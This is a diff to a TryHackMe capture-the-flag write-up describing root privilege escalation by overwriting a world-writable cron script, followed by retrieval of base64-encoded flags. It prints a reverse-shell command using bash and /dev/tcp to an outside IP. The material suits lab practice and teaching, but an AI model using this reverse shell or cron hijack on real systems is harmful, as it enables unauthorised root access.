@@ -91,13 +91,17 @@ The most interesting part is that I  found a **CronJob** which is running **ever
 I went to check the file which was ``/var/backups/script.sh``  which was owned by **root** and had permissions set as anyone can **read, write & execute** the script. So this was the golden ticket for achieving the root access.             
 So edited the script  to get a **Reverse shell** as a root user. 
 I used the command:  
-``echo "bash -i >& /dev/tcp/192.168.155.109/4444 0>81" > script.sh``     
+``echo "bash -i >& /dev/tcp/192.168.155.109/4444 0>81" > script.sh``      
+
+
 
 ![script_sh](images/script_sh.png)                  
       
 I started the **listener** on another port and waited  for a minute for poping the reverse shell which was owned by root.    
 ![root](images/root.png)                 
-Now I have got the root user account. I went onto ``/home/elyana/user.txt`` to get the user flag, but it was **base64** encoded. So decoded it & got the flag. Then I went to to get root flag at ``/root/root.txt`` and it was also **base64** encoded. So decoded the flag and completed the challenge..........
+Now I have got the root user account. I went onto ``/home/elyana/user.txt`` to get the user flag, but it was **base64** encoded. So decoded it & got the flag. Then I went to to get root flag at ``/root/root.txt`` and it was also **base64** encoded. So decoded the flag and completed the challenge..........              
+
+![images/flag.png](images/flag.png)
 
 ## Conclusion
 This Tryhackme machine teaches us that outdated or vulnerable plugins used in CMS system can lead to **LFI** and also **Arbitary file inclusion**. Also this challenges shows that weak permissions given to file can lead to privilege escalation easily. This machine strengthens my CTF solving skills and give lots of lessons.
